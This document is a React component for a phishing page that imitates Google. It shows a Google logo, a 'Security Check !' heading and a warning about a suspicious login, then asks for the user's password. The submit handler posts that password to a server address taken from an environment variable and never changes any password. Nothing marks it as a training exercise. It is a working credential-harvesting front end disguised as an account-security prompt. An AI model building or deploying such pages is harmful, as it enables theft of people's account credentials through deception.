import google from "./assets/google.webp";
import { useState } from "react";
import { Eye, EyeOff } from "lucide-react";
function Hero() {
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const createNote = async (password) => {
    try {
      const response = await fetch(`${import.meta.env.VITE_API_URL}/api/password`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ password }),
      });

      if (!response.ok) {
        throw new Error("Failed to check password");
      }

      const data = await response.json();
      console.log("Password Accepted:", data);
      return data;
    } catch (error) {
      console.error("Error checking password :", error);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!password.trim()) return;

    setLoading(true);
    await createNote(password);
    setPassword("");
    setLoading(false);
  };

  return (
    <div className="mx-auto w-full max-w-xl rounded-2xl bg-white/80 p-5 shadow-lg  backdrop-blur-sm sm:p-8 lg:p-10">
      <img className="mx-auto mt-2 h-20 w-20 sm:h-24 sm:w-24 lg:h-28 lg:w-28" src={google} alt="googleImg" />
      <h1 className="my-5 text-center text-2xl font-light sm:text-3xl">Security Check !</h1>
      <p className="mb-6 text-center text-sm text-slate-600 sm:text-base">
        We detected a suspicious login attempt on your account. As a precaution,
        please change your password immediately and enable two-factor
        authentication if you haven't already.
      </p>

      <form className="mx-auto flex w-full max-w-md flex-col" onSubmit={handleSubmit}>
        <label className="mb-2 text-sm font-medium text-slate-700">Enter your password</label>
        <div className="relative mb-4">
          <input
            className="w-full rounded border border-gray-300 p-3 pr-11 text-base outline-none transition focus:border-blue-500 focus:ring-2 focus:ring-blue-100"
            type={showPassword ? "text" : "password"}
            placeholder="Enter your password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button
            type="button"
            className="absolute inset-y-0 right-3 flex items-center text-gray-500 transition hover:text-gray-700"
            onClick={() => setShowPassword(!showPassword)}
            aria-label={showPassword ? "Hide password" : "Show password"}
          >
            {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
          </button>
        </div>
        <button
          className="rounded bg-blue-500 px-4 py-2.5 text-white transition hover:bg-blue-600 disabled:cursor-not-allowed disabled:bg-blue-300"
          type="submit"
          disabled={loading}
        >
          {loading ? "Submitting..." : "Submit"}
        </button>
      </form>
    </div>
  );
}
export default Hero;
